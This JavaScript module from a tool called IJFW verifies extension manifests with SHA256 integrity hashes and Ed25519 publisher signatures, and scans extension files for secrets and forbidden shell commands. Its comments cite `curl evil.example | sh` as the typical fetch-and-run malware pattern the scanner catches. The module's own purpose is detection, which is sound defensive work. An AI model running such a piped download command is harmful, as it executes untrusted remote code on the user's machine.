/**
 * Extension integrity module — IJFW 1.4.0 Open Ecosystem.
 *
 * IMPORTANT — read this before extending or consuming this module:
 *
 * This is a tamper-detection integrity hash, NOT a cryptographic signature.
 * Publisher authenticity is verified via Trident audit at install time, not
 * via this module. The SHA256 hash here detects in-transit corruption and
 * naive post-install edits — it does not authenticate the publisher and it
 * does not prevent a malicious publisher from publishing a malicious
 * extension that carries its own valid hash.
 *
 * In v1.4.0 trust = Trident install-gate audit (3-lens consensus) + this
 * integrity hash + install-time static analysis (`scanExtensionForSecrets`
 * via `classify()` from redactor.js, and `scanInlineCommands` via
 * `isSafeVerifyCommand()` from ralph-allowlist.js).
 *
 * Asymmetric publisher signing (Ed25519 + publisher key registry) is
 * deferred to v1.5.0. At that point a separate `extension-signing.js`
 * module will handle signatures, and this module may be renamed to
 * `extension-integrity.js` (residual R13 — kept as `extension-signer.js`
 * for v1.4.0 to avoid mid-wave import churn).
 *
 * Spec: .planning/1.4.0/security-spec.md
 *
 * This module performs purely static analysis. It uses node:crypto and
 * node:fs/promises only — no subprocess invocations.
 */

// TODO(v1.5.0): rename file to `extension-integrity.js` and add a separate
// `extension-signing.js` for asymmetric publisher signatures (residual R13).

import {
  createHash,
  createPrivateKey,
  createPublicKey,
  generateKeyPairSync,
  sign as cryptoSign,
  verify as cryptoVerify,
} from 'node:crypto';
import { readdir, readFile, stat, mkdir, writeFile, chmod } from 'node:fs/promises';
import { homedir } from 'node:os';
import { join, relative, sep } from 'node:path';

import { classify } from './redactor.js';
import { isSafeVerifyCommand } from './ralph-allowlist.js';
import {
  INTEGRITY_PATTERN,
  PERMISSION_READS,
  PERMISSION_WRITES,
  SIGNATURE_PATTERN,
  PUBLISHER_KEY_ID_PATTERN,
} from './extension-manifest-schema.js';

/**
 * Recursively sort object keys to produce a stable canonical representation.
 * Arrays preserve order (semantically meaningful); objects sort keys.
 * Primitives pass through. `undefined` values are dropped (JSON-equivalent).
 *
 * @param {*} v
 * @returns {*}
 */
function sortKeysDeep(v) {
  if (Array.isArray(v)) {
    return v.map(sortKeysDeep);
  }
  if (v !== null && typeof v === 'object') {
    const out = {};
    const keys = Object.keys(v).sort();
    for (const k of keys) {
      if (v[k] === undefined) continue;
      out[k] = sortKeysDeep(v[k]);
    }
    return out;
  }
  return v;
}

/**
 * Produce the canonical JSON representation of a manifest for hashing.
 * Recursively sorts object keys; omits the top-level `integrity` field.
 *
 * @param {object} manifest
 * @returns {string} canonical JSON string (UTF-8)
 */
export function canonicalise(manifest) {
  if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) {
    // Be permissive on inputs that aren't object-shaped — caller is responsible
    // for shape, this function only serialises deterministically.
    return JSON.stringify(sortKeysDeep(manifest));
  }
  // Top-level integrity field is excluded from the canonical body — the hash
  // we compute here is what GOES INTO that field.
  const shallow = {};
  for (const k of Object.keys(manifest)) {
    if (k === 'integrity') continue;
    shallow[k] = manifest[k];
  }
  return JSON.stringify(sortKeysDeep(shallow));
}

/**
 * Compute the SHA256 integrity hash over the canonical manifest and return
 * a NEW manifest (shallow copy of input) with the `integrity` field
 * populated as `sha256:<64 lowercase hex>`.
 *
 * @param {object} manifest
 * @returns {object} manifest with `integrity: "sha256:<64 lowercase hex>"`
 */
export function computeIntegrity(manifest) {
  const canonical = canonicalise(manifest);
  const digest = createHash('sha256').update(canonical, 'utf8').digest('hex');
  return { ...manifest, integrity: `sha256:${digest}` };
}

/**
 * Verify the integrity hash on a manifest. Recomputes the canonical hash and
 * compares to the `integrity` field. Returns `valid: false` (does NOT throw)
 * when the input lacks an integrity field or the field is malformed.
 *
 * Enforces the strict format `^sha256:[a-f0-9]{64}$` per residual R5.
 *
 * @param {object} manifest
 * @returns {{ valid: boolean, expected: string | null, got: string | null }}
 */
export function verifyIntegrity(manifest) {
  if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) {
    return { valid: false, expected: null, got: null };
  }
  const got = typeof manifest.integrity === 'string' ? manifest.integrity : null;
  if (got === null) {
    return { valid: false, expected: null, got: null };
  }
  if (!INTEGRITY_PATTERN.test(got)) {
    return { valid: false, expected: null, got };
  }
  // Deep clone to avoid any mutation of the caller's object.
  const clone = JSON.parse(JSON.stringify(manifest));
  delete clone.integrity;
  const canonical = canonicalise(clone);
  const digest = createHash('sha256').update(canonical, 'utf8').digest('hex');
  const expected = `sha256:${digest}`;
  return { valid: expected === got, expected, got };
}

// Directories never scanned for secrets — large, generated, or VCS metadata.
const SCAN_SKIP_DIRS = new Set([
  'node_modules',
  '.git',
  '.svn',
  '.hg',
  'dist',
  'build',
  '.next',
  '.cache',
]);

// Files larger than this are treated as binary and skipped (1 MiB).
const SCAN_MAX_FILE_BYTES = 1024 * 1024;

/**
 * Walk a directory tree, yielding absolute file paths. Skips SCAN_SKIP_DIRS.
 *
 * @param {string} root
 * @returns {AsyncGenerator<string>}
 */
async function* walkFiles(root) {
  const entries = await readdir(root, { withFileTypes: true });
  for (const entry of entries) {
    const full = join(root, entry.name);
    if (entry.isDirectory()) {
      if (SCAN_SKIP_DIRS.has(entry.name)) continue;
      yield* walkFiles(full);
    } else if (entry.isFile()) {
      yield full;
    }
    // Symlinks and other entry types are intentionally skipped.
  }
}

/**
 * Heuristically detect a binary file by null-byte presence in the head buffer.
 *
 * @param {Buffer} buf
 * @returns {boolean}
 */
function looksBinary(buf) {
  const limit = Math.min(buf.length, 8192);
  for (let i = 0; i < limit; i++) {
    if (buf[i] === 0) return true;
  }
  return false;
}

/**
 * Walk all files under `extensionDir` and scan each line for known secret
 * patterns using `classify()` from `mcp-server/src/redactor.js`. Does NOT
 * use `redactSecrets()` for detection — that returns the redacted string,
 * not findings.
 *
 * Findings include `{file, line, kind}` — never the matched value itself
 * (security spec §3.1).
 *
 * @param {string} extensionDir
 * @returns {Promise<{ clean: boolean, findings: Array<{ file: string, line: number, kind: string }> }>}
 */
export async function scanExtensionForSecrets(extensionDir) {
  const findings = [];
  for await (const absPath of walkFiles(extensionDir)) {
    let buf;
    try {
      const st = await stat(absPath);
      if (st.size > SCAN_MAX_FILE_BYTES) continue; // skip large/binary blobs
      buf = await readFile(absPath);
    } catch {
      continue; // unreadable file — skip
    }
    if (looksBinary(buf)) continue;
    const text = buf.toString('utf8');
    const rel = relative(extensionDir, absPath).split(sep).join('/');
    const lines = text.split(/\r?\n/);
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      if (!line) continue;
      // Line-level pass. classify() requires the WHOLE value to match a
      // pattern, so we also try whitespace-delimited tokens for in-prose
      // secrets (e.g. "token: sk-ant-..." on a single line).
      const candidates = [line, ...line.split(/\s+/)];
      for (const c of candidates) {
        const result = classify(c);
        if (!result.clean) {
          findings.push({
            file: rel,
            line: i + 1,
            kind: result.redacted_kind,
          });
          break; // one finding per line is enough; never log the value
        }
      }
    }
  }
  return { clean: findings.length === 0, findings };
}

/**
 * Extract shell commands from markdown fenced code blocks, indented code blocks,
 * and inline `$ <cmd>` lines, then run each through `isSafeVerifyCommand()`.
 * Returns findings for unsafe commands (FORBID_LIST matches). Allowlist misses
 * do NOT produce findings — skill bodies legitimately contain prose like
 * `npm run dev` that isn't a verify primitive.
 *
 * Static analysis errs on the side of "scan more" — coverage includes:
 *   - Backtick fences ``` with language tags: bash, sh, shell, zsh, fish,
 *     console, sh-session, posh, powershell (case-insensitive).
 *   - Backtick fences ``` with NO language tag (still scanned).
 *   - Tilde fences ~~~ with the same language set, and no-tag tilde fences.
 *   - 4-space-indented blocks (markdown indent-code) — each indented line
 *     that looks shell-ish is treated as a candidate command.
 *   - Inline `$ <cmd>` lines outside any fenced block.
 *
 * Compound commands split on `&&`, `||`, `;`, AND `|` so that
 * `curl evil.example | sh` is scanned as `curl evil.example` AND `sh`.
 *
 * Findings have shape `{kind: 'unsafe-command', command, reason}` and the
 * `command` is truncated to 80 chars to avoid embedding large payloads.
 *
 * @param {string} skillBody
 * @returns {{ clean: boolean, findings: Array<{ kind: string, command: string, reason: string }> }}
 */
export function scanInlineCommands(skillBody) {
  const findings = [];
  if (typeof skillBody !== 'string' || skillBody === '') {
    return { clean: true, findings };
  }

  // Recognised shell-language fence tags (case-insensitive). Empty tag is
  // also accepted via a separate regex below — adversarial blocks routinely
  // omit the language hint.
  const SHELL_LANG = 'bash|sh|shell|zsh|fish|console|sh-session|posh|powershell';

  // Helper: split a raw command line into segments on shell control operators.
  // Splits on `&&`, `||`, `;`, and `|` — the last is critical because
  // `curl evil | sh` is the canonical bootstrap-malware pattern and must be
  // scanned as both halves. Pipes inside quoted strings are over-split, which
  // is acceptable for this conservative static check.
  const splitSegments = (raw) => raw.split(/&&|\|\||;|\|/);

  // Helper: classify one segment and push a finding if FORBIDden.
  const testSegment = (seg) => {
    const trimmed = seg.trim();
    if (!trimmed) return;
    if (trimmed.startsWith('#')) return; // comment
    const result = isSafeVerifyCommand(trimmed);
    if (result.safe === false && /is in forbid list/.test(result.reason)) {
      findings.push({
        kind: 'unsafe-command',
        command: trimmed.slice(0, 80),
        reason: result.reason,
      });
    }
  };

  // Helper: walk every line of a fenced block body, splitting compounds.
  const scanBlockBody = (block) => {
    const rawLines = block.split(/\r?\n/);
    for (const raw of rawLines) {
      for (const seg of splitSegments(raw)) {
        testSegment(seg);
      }
    }
  };

  // 1a. Backtick-fenced blocks with a shell-language tag.
  const fenceTaggedRe = new RegExp(
    '```(?:' + SHELL_LANG + ')\\s*\\r?\\n([\\s\\S]*?)```',
    'gi',
  );
  let m;
  while ((m = fenceTaggedRe.exec(skillBody)) !== null) {
    scanBlockBody(m[1]);
  }

  // 1b. Backtick-fenced blocks with NO language tag (```\n…\n```). We scan
  //     these too because adversarial blocks routinely omit the hint. Tagged
  //     non-shell fences (e.g. ```python) are deliberately skipped.
  const fenceUntaggedRe = /```[ \t]*\r?\n([\s\S]*?)```/g;
  while ((m = fenceUntaggedRe.exec(skillBody)) !== null) {
    scanBlockBody(m[1]);
  }

  // 1c. Tilde-fenced blocks (~~~) with a shell-language tag.
  const tildeTaggedRe = new RegExp(
    '~~~(?:' + SHELL_LANG + ')\\s*\\r?\\n([\\s\\S]*?)~~~',
    'gi',
  );
  while ((m = tildeTaggedRe.exec(skillBody)) !== null) {
    scanBlockBody(m[1]);
  }

  // 1d. Tilde-fenced blocks with NO language tag.
  const tildeUntaggedRe = /~~~[ \t]*\r?\n([\s\S]*?)~~~/g;
  while ((m = tildeUntaggedRe.exec(skillBody)) !== null) {
    scanBlockBody(m[1]);
  }

  // 2. 4-space-indented code blocks. We strip fenced blocks first to avoid
  //    double-counting their interiors as indented blocks. Each indented line
  //    whose post-indent content starts with a shell-ish character (a-z, /,
  //    or .) is treated as a candidate command and split on operators.
  let stripped = skillBody.replace(/```[\s\S]*?```/g, '');
  stripped = stripped.replace(/~~~[\s\S]*?~~~/g, '');
  const lines = stripped.split(/\r?\n/);
  for (const line of lines) {
    // 4+ leading spaces (no tabs — CommonMark indented-code is space-only).
    const im = line.match(/^[ ]{4,}(.*)$/);
    if (!im) continue;
    const content = im[1];
    // Shell-looking heuristic: starts with a letter, `.`, or `/` and is not
    // a code-block comment or empty.
    if (!/^[a-zA-Z./]/.test(content)) continue;
    for (const seg of splitSegments(content)) {
      testSegment(seg);
    }
  }

  // 3. Inline `$ <cmd>` lines outside any fenced/tilde block.
  const inlineRe = /^\s*\$\s+(.+)$/gm;
  while ((m = inlineRe.exec(stripped)) !== null) {
    for (const seg of splitSegments(m[1])) {
      testSegment(seg);
    }
  }

  return { clean: findings.length === 0, findings };
}

/**
 * Validate that an extension's declared permissions are subsets of the
 * schema allowlists (`PERMISSION_READS`, `PERMISSION_WRITES`). v1.4.0
 * permissions are declarative intent — this check guards against typos and
 * out-of-vocabulary declarations.
 *
 * Missing `permissions` block is treated as `{reads: [], writes: []}`
 * (valid). Non-object permissions fail validation.
 *
 * @param {object} manifest
 * @returns {{ valid: boolean, errors: string[] }}
 */
export function validatePermissions(manifest) {
  const errors = [];
  if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) {
    return { valid: false, errors: ['manifest: must be an object'] };
  }
  const perms = manifest.permissions;
  if (perms === undefined) {
    // Treat as empty (valid).
    return { valid: true, errors: [] };
  }
  if (perms === null || typeof perms !== 'object' || Array.isArray(perms)) {
    return { valid: false, errors: ['permissions: must be an object with reads/writes arrays'] };
  }

  const reads = perms.reads ?? [];
  const writes = perms.writes ?? [];

  if (!Array.isArray(reads)) {
    errors.push('permissions.reads: must be an array');
  } else {
    reads.forEach((p, i) => {
      if (typeof p !== 'string') {
        errors.push(`permissions.reads[${i}]: must be a string`);
        return;
      }
      if (!PERMISSION_READS.includes(p)) {
        errors.push(`permissions.reads[${i}]: ${JSON.stringify(p)} not in allowlist`);
      }
    });
  }

  if (!Array.isArray(writes)) {
    errors.push('permissions.writes: must be an array');
  } else {
    writes.forEach((p, i) => {
      if (typeof p !== 'string') {
        errors.push(`permissions.writes[${i}]: must be a string`);
        return;
      }
      if (!PERMISSION_WRITES.includes(p)) {
        errors.push(`permissions.writes[${i}]: ${JSON.stringify(p)} not in allowlist`);
      }
    });
  }

  return { valid: errors.length === 0, errors };
}

// === W7/B1: Asymmetric Ed25519 publisher signing =========================
//
// Trust model upgrade for v1.4.0:
//   - integrity (sha256) detects tamper, independent of signing.
//   - signature (ed25519) binds a manifest to a publisher keypair.
//   - publisher_key_id = sha256 fingerprint (hex) of the PEM-encoded public key.
//   - Trusted publishers store at ~/.ijfw/trusted-publishers.json.
//   - Keypairs persist at ~/.ijfw/keys/<keyId>/ (private 0600, public 0644).
//
// Canonicalisation for signing: drop `signature` AND `integrity` fields, then
// serialise with sortKeysDeep -> JSON.stringify. Verification re-creates the
// same canonical form.

function keysRoot() {
  return join(homedir(), '.ijfw', 'keys');
}

function trustedPublishersPath() {
  return join(homedir(), '.ijfw', 'trusted-publishers.json');
}

/**
 * Canonical bytes for signing: drop signature + integrity, sort keys deep,
 * UTF-8 encode. Shared by signManifest / verifyManifestSignature so both
 * sides produce byte-identical input.
 *
 * @param {object} manifest
 * @returns {Buffer}
 */
function canonicalSigningBytes(manifest) {
  if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) {
    return Buffer.from(JSON.stringify(sortKeysDeep(manifest)), 'utf8');
  }
  const shallow = {};
  for (const k of Object.keys(manifest)) {
    if (k === 'signature' || k === 'integrity') continue;
    shallow[k] = manifest[k];
  }
  return Buffer.from(JSON.stringify(sortKeysDeep(shallow)), 'utf8');
}

/**
 * Compute the sha256 hex fingerprint (lowercase) of a PEM-encoded public key.
 * Uses the DER-encoded form so a re-encode of the same key still fingerprints
 * to the same id.
 *
 * @param {string} publicKeyPem
 * @returns {string}
 */
export function publicKeyFingerprint(publicKeyPem) {
  const key = createPublicKey(publicKeyPem);
  const der = key.export({ type: 'spki', format: 'der' });
  return createHash('sha256').update(der).digest('hex');
}

/**
 * Generate a new Ed25519 publisher keypair, persist it under ~/.ijfw/keys/<keyId>/,
 * and return the in-memory PEM material + the derived keyId.
 *
 * @param {string} [authorName] informational only (recorded in the receipt)
 * @returns {Promise<{ publicKey: string, privateKey: string, keyId: string, dir: string }>}
 */
export async function generatePublisherKeypair(authorName) {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  const publicKeyPem = publicKey.export({ type: 'spki', format: 'pem' }).toString();
  const privateKeyPem = privateKey.export({ type: 'pkcs8', format: 'pem' }).toString();
  const keyId = publicKeyFingerprint(publicKeyPem);

  const dir = join(keysRoot(), keyId);
  await mkdir(dir, { recursive: true });
  const pubPath = join(dir, 'public.pem');
  const privPath = join(dir, 'private.pem');
  await writeFile(pubPath, publicKeyPem, 'utf8');
  await writeFile(privPath, privateKeyPem, { encoding: 'utf8', mode: 0o600 });
  // Re-chmod belt-and-braces; some platforms ignore the open-time mode arg.
  try { await chmod(privPath, 0o600); } catch { /* best-effort */ }
  try { await chmod(pubPath, 0o644); } catch { /* best-effort */ }

  // Author receipt (informational; not authoritative).
  if (typeof authorName === 'string' && authorName.length > 0) {
    try {
      await writeFile(
        join(dir, 'author.txt'),
        `${authorName}\n${new Date().toISOString()}\n`,
        'utf8',
      );
    } catch { /* non-fatal */ }
  }

  return { publicKey: publicKeyPem, privateKey: privateKeyPem, keyId, dir };
}

/**
 * Load a previously-generated keypair from ~/.ijfw/keys/<keyId>/. Returns null
 * if either file is missing.
 *
 * @param {string} keyId
 * @returns {Promise<{ publicKey: string, privateKey: string, keyId: string } | null>}
 */
export async function loadPublisherKeypair(keyId) {
  if (typeof keyId !== 'string' || !PUBLISHER_KEY_ID_PATTERN.test(keyId)) return null;
  const dir = join(keysRoot(), keyId);
  try {
    const [publicKey, privateKey] = await Promise.all([
      readFile(join(dir, 'public.pem'), 'utf8'),
      readFile(join(dir, 'private.pem'), 'utf8'),
    ]);
    return { publicKey, privateKey, keyId };
  } catch {
    return null;
  }
}

/**
 * Sign a manifest. Returns a NEW manifest with `signature` + `publisher_key_id`
 * fields populated. Re-computes integrity AFTER signing so the integrity hash
 * covers the signature payload too (signature is excluded from signing bytes
 * but included in integrity bytes, so any post-sign edit is detected).
 *
 * @param {object} manifest
 * @param {string} privateKeyPem
 * @returns {object} manifest with signature, publisher_key_id, integrity
 */
export function signManifest(manifest, privateKeyPem) {
  if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) {
    throw new TypeError('signManifest: manifest must be an object');
  }
  const priv = createPrivateKey(privateKeyPem);
  // Derive the matching public key + keyId so the publisher_key_id is
  // self-consistent with the signing material.
  const pub = createPublicKey(priv);
  const publicKeyPem = pub.export({ type: 'spki', format: 'pem' }).toString();
  const keyId = publicKeyFingerprint(publicKeyPem);

  // Add publisher_key_id BEFORE computing signing bytes so verify-time canonical
  // bytes (which include publisher_key_id) match sign-time canonical bytes.
  const toSign = { ...manifest, publisher_key_id: keyId };
  const bytes = canonicalSigningBytes(toSign);
  const sigBuf = cryptoSign(null, bytes, priv);
  const signature = `ed25519:${sigBuf.toString('base64')}`;

  const signed = {
    ...toSign,
    signature,
  };
  // Recompute integrity to cover the signature + key id fields.
  return computeIntegrity(signed);
}

/**
 * Verify a manifest's signature against a map of trusted publishers.
 *
 * @param {object} manifest
 * @param {{ publishers: Record<string, { publicKey: string, name?: string }> } | null} trustedKeys
 * @returns {{ valid: boolean, publisherKeyId: string | null, reason: string }}
 */
export function verifyManifestSignature(manifest, trustedKeys) {
  if (manifest === null || typeof manifest !== 'object' || Array.isArray(manifest)) {
    return { valid: false, publisherKeyId: null, reason: 'manifest must be an object' };
  }
  const sig = typeof manifest.signature === 'string' ? manifest.signature : null;
  const kid = typeof manifest.publisher_key_id === 'string' ? manifest.publisher_key_id : null;
  if (!sig) return { valid: false, publisherKeyId: null, reason: 'manifest has no signature' };
  if (!SIGNATURE_PATTERN.test(sig)) return { valid: false, publisherKeyId: null, reason: 'signature shape invalid' };
  if (!kid) return { valid: false, publisherKeyId: null, reason: 'manifest missing publisher_key_id' };
  if (!PUBLISHER_KEY_ID_PATTERN.test(kid)) return { valid: false, publisherKeyId: kid, reason: 'publisher_key_id shape invalid' };

  const publishers = (trustedKeys && trustedKeys.publishers) || {};
  const entry = publishers[kid];
  if (!entry || typeof entry.publicKey !== 'string') {
    return { valid: false, publisherKeyId: kid, reason: `publisher ${kid} not trusted` };
  }

  let pubKey;
  try {
    pubKey = createPublicKey(entry.publicKey);
  } catch (err) {
    return { valid: false, publisherKeyId: kid, reason: `trusted publisher key unparseable: ${err.message}` };
  }
  // Belt-and-braces: confirm the trusted key actually fingerprints to the
  // declared keyId. Defends against a tampered trusted-publishers.json where
  // someone swapped publicKey but kept the keyId.
  try {
    const fp = publicKeyFingerprint(entry.publicKey);
    if (fp !== kid) {
      return { valid: false, publisherKeyId: kid, reason: 'trusted publicKey does not match keyId' };
    }
  } catch {
    return { valid: false, publisherKeyId: kid, reason: 'trusted publicKey fingerprint failed' };
  }

  const sigB64 = sig.slice('ed25519:'.length);
  let sigBuf;
  try {
    sigBuf = Buffer.from(sigB64, 'base64');
  } catch {
    return { valid: false, publisherKeyId: kid, reason: 'signature base64 decode failed' };
  }

  const bytes = canonicalSigningBytes(manifest);
  let ok;
  try {
    ok = cryptoVerify(null, bytes, pubKey, sigBuf);
  } catch (err) {
    return { valid: false, publisherKeyId: kid, reason: `verify failed: ${err.message}` };
  }
  if (!ok) return { valid: false, publisherKeyId: kid, reason: 'signature does not verify' };
  return { valid: true, publisherKeyId: kid, reason: 'ok' };
}

/**
 * Read the trusted publishers JSON. Returns `{publishers: {}}` when absent or
 * malformed (fail-closed for verification: no trusted keys means nothing is
 * trusted).
 *
 * @returns {Promise<{ publishers: Record<string, { name?: string, publicKey: string, added_at?: string }> }>}
 */
export async function readTrustedPublishers() {
  const path = trustedPublishersPath();
  let raw;
  try {
    raw = await readFile(path, 'utf8');
  } catch {
    return { publishers: {} };
  }
  let parsed;
  try {
    parsed = JSON.parse(raw);
  } catch {
    return { publishers: {} };
  }
  if (!parsed || typeof parsed !== 'object' || parsed.publishers === null || typeof parsed.publishers !== 'object') {
    return { publishers: {} };
  }
  // Filter entries to well-formed records.
  const out = { publishers: {} };
  for (const [kid, val] of Object.entries(parsed.publishers)) {
    if (!PUBLISHER_KEY_ID_PATTERN.test(kid)) continue;
    if (!val || typeof val !== 'object' || typeof val.publicKey !== 'string') continue;
    out.publishers[kid] = {
      name: typeof val.name === 'string' ? val.name : undefined,
      publicKey: val.publicKey,
      added_at: typeof val.added_at === 'string' ? val.added_at : undefined,
    };
  }
  return out;
}

async function writeTrustedPublishers(store) {
  const path = trustedPublishersPath();
  await mkdir(join(homedir(), '.ijfw'), { recursive: true });
  await writeFile(path, JSON.stringify(store, null, 2) + '\n', 'utf8');
}

/**
 * Add (or replace) a trusted publisher entry. Validates the publicKey
 * fingerprint against the supplied keyId. Returns the updated store.
 *
 * @param {string} keyId
 * @param {string} publicKey PEM-encoded
 * @param {string} [name]
 * @returns {Promise<{ ok: boolean, error?: string, store?: object }>}
 */
export async function addTrustedPublisher(keyId, publicKey, name) {
  if (typeof keyId !== 'string' || !PUBLISHER_KEY_ID_PATTERN.test(keyId)) {
    return { ok: false, error: 'invalid keyId' };
  }
  if (typeof publicKey !== 'string' || publicKey.indexOf('BEGIN PUBLIC KEY') === -1) {
    return { ok: false, error: 'publicKey must be PEM-encoded' };
  }
  let fp;
  try {
    fp = publicKeyFingerprint(publicKey);
  } catch (err) {
    return { ok: false, error: `publicKey unparseable: ${err.message}` };
  }
  if (fp !== keyId) {
    return { ok: false, error: 'publicKey fingerprint does not match keyId' };
  }
  const store = await readTrustedPublishers();
  store.publishers[keyId] = {
    name: typeof name === 'string' && name.length > 0 ? name : undefined,
    publicKey,
    added_at: new Date().toISOString(),
  };
  await writeTrustedPublishers(store);
  return { ok: true, store };
}

/**
 * Remove a trusted publisher entry by keyId. Idempotent.
 *
 * @param {string} keyId
 * @returns {Promise<{ ok: boolean, removed: boolean, store?: object, error?: string }>}
 */
export async function removeTrustedPublisher(keyId) {
  if (typeof keyId !== 'string' || !PUBLISHER_KEY_ID_PATTERN.test(keyId)) {
    return { ok: false, removed: false, error: 'invalid keyId' };
  }
  const store = await readTrustedPublishers();
  const had = Object.prototype.hasOwnProperty.call(store.publishers, keyId);
  if (had) {
    delete store.publishers[keyId];
    await writeTrustedPublishers(store);
  }
  return { ok: true, removed: had, store };
}
